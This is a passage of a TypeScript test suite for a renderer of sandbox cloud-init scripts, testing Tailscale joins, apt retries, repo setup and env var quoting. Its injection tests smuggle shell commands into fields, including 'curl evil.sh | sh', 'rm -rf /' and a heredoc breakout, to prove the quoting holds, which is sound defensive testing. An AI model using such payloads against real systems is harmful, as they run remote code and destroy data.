import { strict as assert } from "node:assert";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";

import {
  BOOTSTRAP_REPORT_PATH,
  renderStepHelpers,
} from "./bootstrap-report";
import {
  parseTailscaleAuthUrl,
  renderCloudInit,
  renderMainTf,
  renderRepoSetup,
  renderTailscaleLogin,
} from "./template";
import type { SandboxSpec } from "./types";

function baseSpec(overrides: Partial<SandboxSpec> = {}): SandboxSpec {
  return {
    provider: "civo",
    name: "nexux-test-abc123",
    region: "NYC1",
    size: "g3.medium",
    diskImage: "ubuntu-jammy",
    installDocker: true,
    installNode: true,
    installClaudeCode: true,
    installAgentBrowser: false,
    installCloudflared: false,
    envVars: {},
    repos: [
      { name: "app", repoUrl: "https://github.com/acme/app.git" },
    ],
    ...overrides,
  };
}

// Executes generated shell in a real bash. On Windows `bash` resolves to
// C:\Windows\System32\bash.exe — the WSL launcher, not a shell: it re-parses
// argv and rewrites paths on the way into the distro, so the temp directories
// these assert against do not exist as written. The scripts under test only
// ever run on Linux instances.
const realBash = {
  skip:
    process.platform === "win32" &&
    "`bash` here is the WSL launcher, which re-parses argv",
};
test("no stack section without compose yaml", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(!script.includes("NEXUX_STACK_EOF"));
  assert.ok(!script.includes("starting stack services"));
});

test("stack section runs after docker install and before repo clone", () => {
  const script = renderCloudInit(
    baseSpec({
      stackComposeYaml: "name: nexux-p1\nservices:\n  postgres:\n    image: postgres:17\n",
      stackServiceNames: ["postgres"],
    }),
  );
  const docker = script.indexOf("installing Docker");
  const stack = script.indexOf("starting stack services: postgres");
  const clone = script.indexOf("git clone");
  assert.ok(docker >= 0 && stack >= 0 && clone >= 0);
  assert.ok(docker < stack, "stack section must come after docker install");
  assert.ok(stack < clone, "stack section must come before repo clone");
  assert.ok(script.includes("docker compose up -d --wait"));
});

test("compose yaml round-trips verbatim through the heredoc", () => {
  const yaml =
    'services:\n  db:\n    image: postgres:17\n    environment:\n      POSTGRES_PASSWORD: "p4$$`w\'d"\n';
  const script = renderCloudInit(baseSpec({ stackComposeYaml: yaml }));
  const body = script
    .split("<<'NEXUX_STACK_EOF'\n")[1]
    .split("\nNEXUX_STACK_EOF")[0];
  assert.equal(body, yaml.trim());
});

test("throws when the yaml contains the heredoc sentinel", () => {
  assert.throws(
    () =>
      renderCloudInit(
        baseSpec({ stackComposeYaml: "services: {}\nNEXUX_STACK_EOF\n" }),
      ),
    /NEXUX_STACK_EOF/,
  );
});

// --- agent CLI bootstrap ----------------------------------------------------
// Pins the installClaudeCode block; the OpenCode block (spec 16) follows the
// same pattern and these tests guard against one toggle affecting the other.

// --- tailscale (optional) ----------------------------------------------------

/**
 * Just the tailscale block. Assertions on the whole script would pass on a
 * match found in an unrelated section — `set +x`, in particular, appears
 * wherever a secret is handled.
 */
function tailscaleSection(script: string): string {
  const start = script.indexOf("installing tailscale");
  assert.ok(start > 0, "the script has no tailscale section");
  const rest = script.slice(start);
  const end = rest.indexOf("installing GitHub CLI");
  return end > 0 ? rest.slice(0, end) : rest;
}

/**
 * Runs one generated `nexus_step_run …` line in a real bash and returns what
 * the wrapped command received, with `runuser` stubbed.
 *
 * Text assertions stop being readable once a command is single-quoted inside
 * a single-quoted argument (spec 24 wraps the repo steps that way), and a
 * wrong nesting produces a *plausible* string — so the only assertion worth
 * making is what bash actually hands to the binary.
 */
function runGeneratedLine(line: string): string {
  const harness = [
    "nexus_bootstrap_fatal(){ echo FATAL:$1; }",
    renderStepHelpers().replace(
      new RegExp(BOOTSTRAP_REPORT_PATH, "g"),
      "/dev/null",
    ),
    'runuser(){ shift 3; echo "RUNUSER-GOT:$*"; }',
    line.trim(),
  ].join("\n");
  return execFileSync("bash", ["-c", harness], { encoding: "utf8" }).trim();
}

test("no tailscale section unless the toggle is on", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(!script.includes("installing tailscale"));
  assert.ok(!script.includes("tailscale up"));
});

test("installTailscale with an auth key joins the tailnet without leaking the key", () => {
  const script = renderCloudInit(
    baseSpec({ installTailscale: true, tailscaleAuthKey: "tskey-auth-SECRET123" }),
  );
  assert.ok(script.includes("installing tailscale"));
  assert.ok(script.includes("tailscale up"));
  assert.ok(script.includes("--hostname='nexux-test-abc123'"));
  // The join must run with tracing off and the key file must be removed:
  // this script is tee'd to a log the UI can read.
  const section = script.slice(script.indexOf("installing tailscale"));
  assert.ok(section.indexOf("set +x") < section.indexOf("tailscale up"));
  assert.ok(section.includes("rm -f /root/.tskey"));
  // Non-fatal: a failed join degrades to a WARN, never aborts the bootstrap.
  //
  // Scoped to the tailscale block rather than "the rest of the script", which
  // also contains the repo setup's own `nexus_bootstrap_fatal` fallback — a
  // match there says nothing about how a failed *join* is handled.
  const joinBlock = section.slice(0, section.indexOf("installing GitHub CLI"));
  assert.ok(!joinBlock.includes("nexus_bootstrap_fatal"));
  assert.ok(!joinBlock.includes("[nexux] FATAL"));
});

test("installTailscale without a key registers interactively", () => {
  const script = renderCloudInit(baseSpec({ installTailscale: true }));
  assert.ok(script.includes("installing tailscale"));
  assert.ok(script.includes("tailscale up \\"));
  // No key to leak, and nothing to hide behind `set +x`.
  assert.ok(!script.includes("--authkey"));
  // Backgrounded: `tailscale up` blocks until a human approves, and the rest
  // of the bootstrap must not wait on that.
  assert.ok(script.includes("tailscale-auth-url=$ts_url"));
});

test("every apt install waits for the dpkg lock", () => {
  // Ubuntu's cloud images run unattended-upgrades on first boot and it holds
  // the dpkg lock; whichever install lands in that window fails with
  // "Could not get lock", degrades to a WARN, and leaves the box finished-
  // but-broken. One sandbox came up with tailscale missing this way.
  const script = renderCloudInit(
    baseSpec({
      installTailscale: true,
      installCloudflared: true,
      installAgentBrowser: true,
    }),
  );
  // Defined before anything could call it — the sections are concatenated in
  // order, so a helper pushed late is a "command not found" for everything
  // above it.
  const helper = script.indexOf("nexus_apt() {");
  assert.ok(helper > -1, "the apt wrapper is not defined");
  assert.ok(
    helper < script.indexOf("nexus_apt update"),
    "the apt wrapper is used before it is defined",
  );
  // Nothing calls apt-get directly any more (the wrapper's own body aside).
  const direct = script
    .split("\n")
    .filter((l) => /(^|[;&|]\s*)apt-get /.test(l) && !l.includes('apt-get "$@"'));
  assert.deepEqual(direct, [], "an apt-get call bypasses the lock wrapper");
  // The installers that shell out to apt themselves can't be wrapped, so they
  // wait first. Tailscale's is the one that actually got caught.
  const ts = tailscaleSection(script);
  assert.ok(
    ts.indexOf("nexus_dpkg_wait") < ts.indexOf("tailscale.com/install.sh"),
    "the tailscale installer does not wait for the dpkg lock",
  );
  // Order, not adjacency: the docker install is wrapped in a recorded step
  // (spec 24), so the curl no longer sits on the line after the wait — but it
  // must still come after it.
  const dockerWait = script.indexOf("nexus_dpkg_wait\n");
  assert.ok(
    dockerWait > -1 &&
      dockerWait < script.indexOf("https://get.docker.com"),
    "the docker installer does not wait for the dpkg lock",
  );
  assert.ok(script.includes("nexus_dpkg_wait\nnpx --yes playwright install"));
});

test("the apt wrapper retries a locked dpkg and nothing else", realBash, () => {
  // The wrapper lifted verbatim out of the rendered script, driven against a
  // fake apt-get. Asserting on the shell text alone would not have caught the
  // failure this exists to prevent — the retry has to key on the lock message
  // specifically, or a genuinely broken install loops for five minutes before
  // reporting the error it already had in hand.
  const fn = renderCloudInit(baseSpec()).match(/^nexus_apt\(\) \{[\s\S]*?^\}$/m);
  assert.ok(fn, "the apt wrapper is not in the rendered script");
  // The wrapper logs to a fixed /tmp path, which is fine on a sandbox (one
  // bootstrap per machine) but not here: `turbo run test test:coverage` runs
  // this file twice at once, and the two bash harnesses then share the log the
  // retry greps. A run that reads the other's log sees no lock message and
  // returns on the first attempt, which surfaced as '100 1' !== '0 3'. Give
  // each run its own path.
  const logFile = path.join(
    fs.mkdtempSync(path.join(os.tmpdir(), "nexux-apt-")),
    "nexus-apt.log",
  );
  const harness = (aptGet: string) => `
${fn[0].replaceAll("/tmp/nexus-apt.log", logFile)}
sleep() { :; }              # the retry backoff, minus the waiting
# The wrapper pipes apt-get into tee, which runs it in a subshell — an attempt
# counter kept in a variable is discarded with it. A file survives.
C=$(mktemp)
echo 0 > "$C"
apt-get() {
  n=$(( $(cat "$C") + 1 ))
  echo "$n" > "$C"
  ${aptGet}
}
nexus_apt install -y pkg >/dev/null 2>&1
rc=$?
echo "$rc $(cat "$C")"`;
  const run = (aptGet: string) =>
    execFileSync("bash", ["-c", harness(aptGet)], { encoding: "utf8" }).trim();

  // Locked twice, then free: retried until it worked.
  assert.equal(
    run(`if [ "$n" -lt 3 ]; then echo "E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 4727 (unattended-upgr)" >&2; return 100; fi; return 0`),
    "0 3",
  );
  // A real failure is reported immediately, with apt's own exit code.
  assert.equal(run(`echo "E: Unable to locate package pkg" >&2; return 100`), "100 1");
  // A lock nobody ever releases is bounded, not infinite.
  const [rc, attempts] = run(
    `echo "E: Could not get lock /var/lib/dpkg/lock-frontend" >&2; return 100`,
  ).split(" ");
  assert.equal(rc, "100");
  assert.ok(Number(attempts) > 1 && Number(attempts) < 40, `attempts=${attempts}`);
});

test("a missing tailscale binary says so at the point of use", () => {
  // The install WARN lands ~700 lines before the end of a bootstrap, far
  // outside the tail the UI shows. Without this second one the only visible
  // evidence is a "refresh session" that returns no URL — which reads as a
  // tailnet problem rather than as a missing package.
  const ts = tailscaleSection(renderCloudInit(baseSpec({ installTailscale: true })));
  assert.ok(ts.includes("WARN: tailscale is not installed"));
  assert.ok(ts.indexOf("else") > ts.indexOf("command -v tailscale"));
});

test("a self-hosted control server is passed to tailscale up, with or without a key", () => {
  const keyed = renderCloudInit(
    baseSpec({
      installTailscale: true,
      tailscaleAuthKey: "tskey-auth-SECRET123",
      // Trailing slash stripped: it must match the flag verbatim.
      tailscaleLoginServer: "https://vpn.example.com/",
    }),
  );
  assert.ok(keyed.includes("--login-server='https://vpn.example.com'"));
  assert.ok(keyed.includes("--authkey="));
  assert.ok(!keyed.includes("vpn.example.com/'"));

  const keyless = renderCloudInit(
    baseSpec({
      installTailscale: true,
      tailscaleLoginServer: "https://vpn.example.com",
    }),
  );
  assert.ok(keyless.includes("--login-server='https://vpn.example.com'"));
  assert.ok(!keyless.includes("--authkey="));
});

test("the join accepts the tailnet's routes, on both paths", () => {
  // Subnet routers are how an internal service becomes reachable; without
  // this the sandbox sends that traffic out its public gateway and the
  // failure shows up as a timeout, not as a missing flag.
  for (const spec of [
    baseSpec({ installTailscale: true, tailscaleAuthKey: "tskey-auth-x" }),
    baseSpec({ installTailscale: true }),
  ]) {
    const section = tailscaleSection(renderCloudInit(spec));
    assert.ok(section.includes("--accept-routes"));
  }
});

test("the join does not take over DNS", () => {
  // Routes add reachability; the tailnet's resolver would *replace* the
  // sandbox's, and a tailnet that resolves public names poorly would break
  // apt, npm and every clone.
  const section = tailscaleSection(
    renderCloudInit(baseSpec({ installTailscale: true })),
  );
  assert.ok(section.includes("--accept-dns=false"));
  assert.ok(!section.includes("--accept-dns=true"));
});

test("no login-server flag when the tailnet is Tailscale's own", () => {
  const script = renderCloudInit(
    baseSpec({ installTailscale: true, tailscaleAuthKey: "tskey-auth-x" }),
  );
  assert.ok(!script.includes("--login-server"));
});

test("a keyless join writes no key file and has nothing to hide", () => {
  const script = renderCloudInit(baseSpec({ installTailscale: true }));
  const section = tailscaleSection(script);
  // The `set +x` / 0600-file dance exists only to keep an auth key out of the
  // log. With no key there is nothing to protect, and a stray `.tskey` write
  // would leave an empty file behind claiming otherwise.
  assert.ok(!section.includes(".tskey"));
  assert.ok(!section.includes("set +x"));
});

test("a keyless join is backgrounded, so cloud-init never waits on a human", () => {
  const script = renderCloudInit(baseSpec({ installTailscale: true }));
  const section = tailscaleSection(script);
  // `tailscale up` blocks until the registration is approved. Run in the
  // foreground it would hold the bootstrap open until it timed out — the
  // repos, the agent CLIs and the stack would all be waiting behind a browser.
  assert.match(section, /\(tailscale up \\[\s\S]*?&\)/);
  // And the wait for the URL is bounded rather than open-ended.
  assert.ok(section.includes("for i in $(seq 1 30); do"));
});

test("a control server does not disturb the key secrecy discipline", () => {
  // The flag is spliced between `--authkey` and the rest of the command, which
  // is exactly where it could push the join out of the untraced block.
  const script = renderCloudInit(
    baseSpec({
      installTailscale: true,
      tailscaleAuthKey: "tskey-auth-SECRET123",
      tailscaleLoginServer: "https://vpn.example.com",
    }),
  );
  const section = tailscaleSection(script);
  assert.ok(section.indexOf("set +x") < section.indexOf("tailscale up"));
  assert.ok(section.indexOf("tailscale up") < section.indexOf("rm -f /root/.tskey"));
  assert.equal(
    section.split("tskey-auth-SECRET123").length - 1,
    1,
    "the key must appear once, in the file write",
  );
});

test("container mode keeps its hand-rolled daemon on the keyless path too", () => {
  const script = renderCloudInit(
    baseSpec({
      installTailscale: true,
      tailscaleLoginServer: "https://vpn.example.com",
    }),
    { mode: "container" },
  );
  const section = tailscaleSection(script);
  assert.ok(!section.includes("systemctl"));
  assert.ok(section.includes("tailscaled $TS_FLAGS"));
  // The daemon has to be up before anything tries to register against it.
  assert.ok(section.indexOf("tailscaled $TS_FLAGS") < section.indexOf("tailscale up"));
});

test("a quote in the control server cannot break out of the shell string", () => {
  const script = renderCloudInit(
    baseSpec({
      installTailscale: true,
      tailscaleLoginServer: "https://x'; curl evil.sh | sh; '",
    }),
  );
  assert.ok(!script.includes("; curl evil.sh | sh; '\n"));
  assert.ok(script.includes(`'\\''`));
});

test("a control server on its own does not switch tailscale on", () => {
  // The toggle owns whether tailscale is installed at all; a credential left
  // selected on a sandbox whose toggle is off must not resurrect the section.
  const script = renderCloudInit(
    baseSpec({ tailscaleLoginServer: "https://vpn.example.com" }),
  );
  assert.ok(!script.includes("installing tailscale"));
  assert.ok(!script.includes("--login-server"));
});

test("the URL the bootstrap echoes is the one the parser reads back", () => {
  // The renderer writes the marker and the UI's parser matches it. A rename on
  // one side would leave a log that looks right and a UI that shows nothing,
  // so the contract is pinned by round-tripping a realistic line.
  const script = renderCloudInit(baseSpec({ installTailscale: true }));
  const echoLine = tailscaleSection(script)
    .split("\n")
    .find((l) => l.includes("$ts_url") && l.trim().startsWith("echo"));
  assert.ok(echoLine, "the bootstrap must echo the URL");
  const logged = echoLine
    .trim()
    .replace(/^echo "/, "")
    .replace(/"$/, "")
    .replace("$ts_url", "https://vpn.example.com/register/abc");
  assert.equal(
    parseTailscaleAuthUrl(logged),
    "https://vpn.example.com/register/abc",
  );
});

test("renderTailscaleLogin is what the bootstrap emits, so both paths agree", () => {
  // The on-demand "refresh session" action runs this same script. A second
  // implementation would be the one that drifts — and a registration begun at
  // bootstrap and finished from the UI is the normal case, not an edge one.
  const standalone = renderTailscaleLogin({
    name: "nexux-test-abc123",
    loginServer: "https://vpn.example.com",
  });
  const inBootstrap = tailscaleSection(
    renderCloudInit(
      baseSpec({
        installTailscale: true,
        tailscaleLoginServer: "https://vpn.example.com",
      }),
    ),
  );
  assert.ok(inBootstrap.includes(standalone));
});

test("renderTailscaleLogin: control server optional, trailing slash stripped", () => {
  assert.ok(
    renderTailscaleLogin({
      name: "sbx",
      loginServer: "https://vpn.example.com/",
    }).includes("--login-server='https://vpn.example.com'"),
  );
  assert.ok(!renderTailscaleLogin({ name: "sbx" }).includes("--login-server"));
  assert.ok(
    !renderTailscaleLogin({ name: "sbx", loginServer: "  " }).includes(
      "--login-server",
    ),
  );
});

test("renderTailscaleLogin: the wait is bounded and caller-set", () => {
  // The action holds an HTTP request open, so it waits less than a bootstrap
  // that only has to not block itself.
  assert.ok(
    renderTailscaleLogin({ name: "sbx", waitSeconds: 25 }).includes(
      "for i in $(seq 1 25); do",
    ),
  );
  assert.ok(
    renderTailscaleLogin({ name: "sbx" }).includes("for i in $(seq 1 30); do"),
  );
});

test("renderTailscaleLogin: a quote in the name cannot break the command", () => {
  const script = renderTailscaleLogin({ name: "sbx'; id; '" });
  assert.ok(script.includes(`'\\''`));
  assert.ok(!script.includes("--hostname=sbx'; id"));
});

// --- repo setup, shared with the retry action -------------------------------

test("renderRepoSetup is what the bootstrap runs, so a retry cannot drift", () => {
  const repos = [{ name: "app", repoUrl: "https://git.example.com/a/app.git" }];
  const standalone = renderRepoSetup(repos);
  assert.ok(renderCloudInit(baseSpec({ repos })).includes(standalone));
  // It carries the token config too: a retry on a box whose /etc/gitconfig is
  // missing or stale should repair itself rather than fail the same way twice.
  assert.ok(standalone.includes("nexus_git_auth"));
});

test("an existing checkout is adopted, never re-cloned", () => {
  // The retry runs this block again. Re-cloning would mean deleting a tree
  // that may hold work — the expensive mistake, against a redundant clone.
  const script = renderRepoSetup([
    { name: "app", repoUrl: "https://git.example.com/a/app.git" },
  ]);
  assert.ok(script.includes("if [ -d '/opt/nexus/app/.git' ]; then"));
  assert.ok(script.includes("already checked out — keeping it"));
  // The guard has to come first, or the clone runs before anything looks.
  assert.ok(script.indexOf("/opt/nexus/app/.git") < script.indexOf("git clone"));
  assert.ok(!script.includes("rm -rf"));
});

test("install still re-runs for an adopted checkout", () => {
  // The clone is usually not the half that failed — a repo cloned but never
  // installed is exactly the state a retry has to fix.
  const script = renderRepoSetup([
    {
      name: "app",
      repoUrl: "https://git.example.com/a/app.git",
      installCommand: "npm ci",
    },
  ]);
  const guard = script.indexOf("already checked out");
  assert.ok(guard > 0);
  assert.ok(script.indexOf("npm ci") > script.indexOf("fi", guard));
});

test("a mounted repo renders without a clone at all", () => {
  // Regression: building the clone chain eagerly called shq(null) on a repo
  // that was never going to be cloned, and threw while rendering.
  const script = renderRepoSetup([{ name: "app", repoUrl: null, mountPath: "/host/app" }]);
  assert.ok(!script.includes("git clone"));
  assert.ok(script.includes("using mounted workspace for app"));
});

// --- waiting for an interactive registration --------------------------------
// The bootstrap otherwise races a human it cannot win against: it reaches the
// clone seconds after printing the link, and on a self-hosted tailnet the git
// host is not reachable until somebody has clicked it.

const SELF_HOSTED = {
  installTailscale: true,
  tailscaleLoginServer: "https://vpn.example.com",
} as const;

test("a keyless self-hosted join makes the bootstrap wait for approval", () => {
  const script = renderCloudInit(baseSpec({ ...SELF_HOSTED }));
  assert.ok(script.includes("waiting for the tailnet registration to be approved"));
  // Gating on the address, not on `tailscale status`: a node can be up and
  // still unregistered, and only an address proves the join landed.
  assert.ok(script.includes('ts_ip="$(tailscale ip -4 2>/dev/null | head -1)"'));
});

test("the wait comes after the offline installs and before anything needing git", () => {
  // Placed late on purpose: the human gets the whole install phase to approve,
  // so by the time the bootstrap blocks the wait is usually already over.
  const script = renderCloudInit(baseSpec({ ...SELF_HOSTED }));
  const wait = script.indexOf("waiting for the tailnet registration");
  assert.ok(script.indexOf("installing tailscale") < wait);
  assert.ok(script.indexOf("installing GitHub CLI") < wait);
  assert.ok(script.indexOf("installing GitLab CLI") < wait);
  // The two things that need the git host:
  assert.ok(wait < script.indexOf("resolving git identity from the token owner"));
  assert.ok(wait < script.indexOf("git clone"));
});

test("the wait re-announces the URL, so it survives the log tail", () => {
  // The UI reads 400 lines; the original announcement is long gone by now.
  const script = renderCloudInit(baseSpec({ ...SELF_HOSTED }));
  const wait = script.slice(script.indexOf("waiting for the tailnet registration"));
  assert.ok(wait.includes("if [ $((ts_waited % 30)) -eq 0 ]; then"));
  assert.ok(wait.includes("tailscale-auth-url=$ts_url"));
  // And the poll runs untraced: `set -x` would write several lines per poll
  // for the whole wait, pushing the re-announced link straight back out of
  // the tail it was re-announced into.
  const loop = wait.indexOf("while [");
  assert.ok(wait.lastIndexOf("set +x", loop) >= 0);
  assert.ok(!wait.slice(wait.lastIndexOf("set +x", loop), loop).includes("set -x"));
  // Balanced: the clone that follows is traced, and it is the step people debug.
  assert.ok(wait.indexOf("set -x") > wait.indexOf("done"));
});

test("the wait is bounded and gives up into a WARN, never an abort", () => {
  // A machine with tooling and no checkout still beats no machine.
  const script = renderCloudInit(baseSpec({ ...SELF_HOSTED }));
  const wait = script.slice(script.indexOf("waiting for the tailnet registration"));
  assert.ok(wait.includes(`while [ "$ts_waited" -lt 600 ]`));
  assert.ok(wait.includes("WARN: not approved after 600s — continuing anyway"));
  assert.ok(!wait.includes("exit 1"));
});

test("nothing waits when the join needs no human", () => {
  // An auth key joins synchronously — `tailscale up` has already returned.
  const keyed = renderCloudInit(
    baseSpec({ ...SELF_HOSTED, tailscaleAuthKey: "tskey-auth-x" }),
  );
  assert.ok(!keyed.includes("waiting for the tailnet registration"));

  // Tailscale's own control plane: a project's repos are not usually behind
  // the tailnet, so a keyless join there does not pay this cost either.
  const hosted = renderCloudInit(baseSpec({ installTailscale: true }));
  assert.ok(!hosted.includes("waiting for the tailnet registration"));

  // And no tailnet at all, obviously.
  assert.ok(!renderCloudInit(baseSpec()).includes("waiting for the tailnet"));
});

test("parseTailscaleAuthUrl reads the registration URL out of a bootstrap log", () => {
  assert.equal(parseTailscaleAuthUrl("[nexux] installing tailscale"), null);
  assert.equal(
    parseTailscaleAuthUrl(
      "[nexux] installing tailscale\n[nexux] tailscale-auth-url=https://vpn.example.com/register/abc\n[nexux] ACTION REQUIRED: open that URL\n",
    ),
    "https://vpn.example.com/register/abc",
  );
  // A re-bootstrap appends a second URL; the newest one is the live one.
  assert.equal(
    parseTailscaleAuthUrl(
      "[nexux] tailscale-auth-url=https://vpn.example.com/register/old\n[nexux] tailscale-auth-url=https://vpn.example.com/register/new\n",
    ),
    "https://vpn.example.com/register/new",
  );
  // The log arrives over ssh, so a line ending is not always a bare \n.
  assert.equal(
    parseTailscaleAuthUrl(
      "[nexux] tailscale-auth-url=https://vpn.example.com/register/abc\r\n",
    ),
    "https://vpn.example.com/register/abc",
  );
  // A last line with no terminator at all — the tail can be cut anywhere.
  assert.equal(
    parseTailscaleAuthUrl(
      "[nexux] tailscale-auth-url=https://vpn.example.com/register/abc",
    ),
    "https://vpn.example.com/register/abc",
  );
  // The marker has to start the line: a mention inside prose (an echoed
  // setup script, a grep of the log) is not an announcement.
  assert.equal(
    parseTailscaleAuthUrl(
      "+ echo [nexux] tailscale-auth-url=https://evil.example.com/register/x\n",
    ),
    null,
  );
});

test("container mode starts tailscaled by hand instead of systemctl", () => {
  const script = renderCloudInit(
    baseSpec({ installTailscale: true, tailscaleAuthKey: "tskey-auth-x" }),
    { mode: "container" },
  );
  const section = script.slice(script.indexOf("installing tailscale"));
  const tsBlock = section.slice(0, section.indexOf("installing GitHub CLI"));
  assert.ok(!tsBlock.includes("systemctl"));
  assert.ok(tsBlock.includes("tailscaled $TS_FLAGS"));
  assert.ok(tsBlock.includes("--tun=userspace-networking"));
});

test("installClaudeCode installs the CLI globally", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(script.includes("npm install -g @anthropic-ai/claude-code"));
});

test("installClaudeCode false â†’ no claude install or settings", () => {
  const script = renderCloudInit(
    baseSpec({
      installClaudeCode: false,
      envVars: { CLAUDE_CODE_OAUTH_TOKEN: "tok-1" },
    }),
  );
  assert.ok(!script.includes("@anthropic-ai/claude-code"));
  assert.ok(!script.includes(".claude/settings.json"));
});

test("claude token lands in settings.json for root and agent user", () => {
  const script = renderCloudInit(
    baseSpec({ envVars: { CLAUDE_CODE_OAUTH_TOKEN: "tok-abc" } }),
  );
  assert.ok(script.includes('for h in /root /home/'));
  assert.ok(script.includes('"CLAUDE_CODE_OAUTH_TOKEN": "tok-abc"'));
  assert.ok(script.includes('chmod 600 "$h/.claude/settings.json"'));
  assert.ok(script.includes('"hasCompletedOnboarding": true'));
});

test("no token â†’ settings.json still written (attribution off), no token env", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(script.includes("npm install -g @anthropic-ai/claude-code"));
  // settings.json now always exists to carry includeCoAuthoredBy: false;
  // without a token it must NOT contain a token env block.
  assert.ok(script.includes(".claude/settings.json"));
  assert.ok(!script.includes("CLAUDE_CODE_OAUTH_TOKEN"));
});

test("env vars are exported system-wide via profile.d before repo clone", () => {
  const script = renderCloudInit(
    baseSpec({ envVars: { OPENAI_API_KEY: "sk-x", MY_VAR: "v" } }),
  );
  const env = script.indexOf("/etc/profile.d/nexus-env.sh");
  const clone = script.indexOf("git clone");
  assert.ok(env >= 0 && clone >= 0 && env < clone);
  assert.ok(script.includes("export OPENAI_API_KEY='sk-x'"));
  assert.ok(script.includes("export MY_VAR='v'"));
});

test("pnpm may build dependencies without an interactive approval", () => {
  // Without this, pnpm 11 exits 1 on ERR_PNPM_IGNORED_BUILDS, and because
  // `pnpm <script>` runs the deps check first, an unattended `pnpm dev` never
  // reaches the app — the sandbox reports it "did not answer on port N".
  const script = renderCloudInit(baseSpec());
  const env = script.indexOf("/etc/profile.d/nexus-env.sh");
  const flag = script.indexOf(
    "export PNPM_CONFIG_DANGEROUSLY_ALLOW_ALL_BUILDS=true",
  );
  assert.ok(flag >= 0, "the setting must be exported");
  // It has to live in the profile.d file, or a login shell will not see it.
  assert.ok(env >= 0 && env < flag);
  const install = script.indexOf("pnpm install");
  if (install >= 0) assert.ok(flag < install, "exported before any install");
});

test("node gets a heap sized to the box, not V8's ~2 GB default", () => {
  // A dev server dying of "Ineffective mark-compacts near heap limit" *after*
  // the tunnel is up reads as a broken tunnel, so this is worth pinning.
  const script = renderCloudInit(baseSpec());
  const line = script
    .split("\n")
    .find((l) => l.includes("NODE_OPTIONS"));
  assert.ok(line, "NODE_OPTIONS must be exported");
  // Computed on source, so resizing the box needs no re-bootstrap.
  assert.match(line, /MemTotal/);
  // A project that sets its own value keeps it.
  assert.match(line, /\$\{NODE_OPTIONS:-/);
});

test("a Vite dev server accepts the preview tunnel's hostname", () => {
  // Without this the tunnel serves "Blocked request. This host is not
  // allowed" instead of the app, and the hostname is random per run so no
  // repo can list it in advance.
  const script = renderCloudInit(baseSpec());
  const line = script
    .split("\n")
    .find((l) => l.includes("__VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS"));
  assert.ok(line, "the allowed-hosts hint must be exported");
  // The leading dot is Vite's wildcard for a domain and its subdomains.
  assert.match(line, /=\.trycloudflare\.com$/);
  // Quotes and backslashes make Vite discard the whole variable.
  assert.ok(!/["'\\]/.test(line.split("=")[1] ?? ""));
});

test("env var values are single-quoted against shell injection", () => {
  const script = renderCloudInit(
    baseSpec({ envVars: { SNEAKY: "$(rm -rf /) '; echo pwned" } }),
  );
  assert.ok(script.includes(`export SNEAKY='$(rm -rf /) '\\''; echo pwned'`));
});

/**
 * Read back a `.env` value the way dotenv does: single quotes are literal,
 * double quotes process escapes. Deliberately local â€” this package must not
 * depend on the web app, and the point is to check what a *reader* recovers
 * rather than to re-test the app's parser.
 */
function readDotenvValue(body: string, key: string): string | undefined {
  const line = body.split("\n").find((l) => l.startsWith(`${key}=`));
  if (!line) return undefined;
  const raw = line.slice(key.length + 1);
  if (raw.startsWith("'")) return raw.slice(1, -1);
  if (!raw.startsWith('"')) return raw;
  return raw
    .slice(1, -1)
    .replace(/\\n/g, "\n")
    .replace(/\\r/g, "\r")
    .replace(/\\"/g, '"')
    .replace(/\\\\/g, "\\");
}

/** The contents written between the repo `.env` heredoc markers. */
function dotenvBody(script: string): string {
  const open = script.indexOf("<<'NEXUX_DOTENV_EOF'");
  assert.ok(open >= 0, "a .env heredoc was emitted");
  const start = script.indexOf("\n", open) + 1;
  const end = script.indexOf("\nNEXUX_DOTENV_EOF", start);
  assert.ok(end > start, "the heredoc is terminated");
  return script.slice(start, end);
}

test("a repo .env keeps a multi-line value on one line", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "app",
          repoUrl: "https://github.com/acme/app.git",
          envVars: {
            KEY: "-----BEGIN-----\nbody\n-----END-----",
            AFTER: "still-here",
          },
        },
      ],
    }),
  );
  const body = dotenvBody(script);
  // One physical line per var â€” the newlines are folded, not emitted raw.
  assert.equal(body.split("\n").length, 2);
  // Single-quoted, so a reader hands back the `\n` escape rather than a real
  // newline. That is the deliberate trade: it is what every reader agrees on
  // (bash does not expand `\n` even inside double quotes), and it is what a
  // JSON payload â€” the case that actually breaks â€” needs.
  assert.equal(readDotenvValue(body, "KEY"), "-----BEGIN-----\\nbody\\n-----END-----");
  // The var after a multi-line value must survive â€” the bug was that the raw
  // newlines turned everything below into stray assignments.
  assert.equal(readDotenvValue(body, "AFTER"), "still-here");
});

test("a repo .env value cannot end the heredoc early", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "app",
          repoUrl: "https://github.com/acme/app.git",
          envVars: {
            EVIL: "x\nNEXUX_DOTENV_EOF\nrm -rf /",
            AFTER: "still-here",
          },
        },
      ],
    }),
  );
  // Exactly one terminator: the real one closing the heredoc.
  assert.equal(script.split(/^NEXUX_DOTENV_EOF$/m).length - 1, 1);
  assert.ok(script.includes("AFTER=still-here"));
});

test("a service-account JSON blob collapses to a single .env line", () => {
  // The real shape that broke it: a JSON credential whose `private_key` holds
  // literal newlines. Written raw, the PEM body became stray assignments and
  // everything below it was lost.
  // A service-account credential as the Google console hands it over: JSON
  // whose `private_key` encodes its PEM newlines as `\n`. The payload already
  // contains `\"` and `\n` that mean something to JSON â€” double-quoting the
  // .env value would escape those backslashes and the reader would hand back
  // `{\"type\"...}`, which no longer parses.
  const serviceAccount = JSON.stringify({
    type: "service_account",
    private_key:
      "-----BEGIN PRIVATE KEY-----\nAAAA+key/one==\nBBBB+key/two==\n-----END PRIVATE KEY-----\n",
    client_email: "svc@example.iam.gserviceaccount.com",
    universe_domain: "googleapis.com",
  });
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "app",
          repoUrl: "https://github.com/acme/app.git",
          envVars: { GOOGLE_CREDENTIALS: serviceAccount, AFTER: "still-here" },
        },
      ],
    }),
  );

  const body = dotenvBody(script);
  // Two vars, two physical lines â€” the whole blob collapsed onto one.
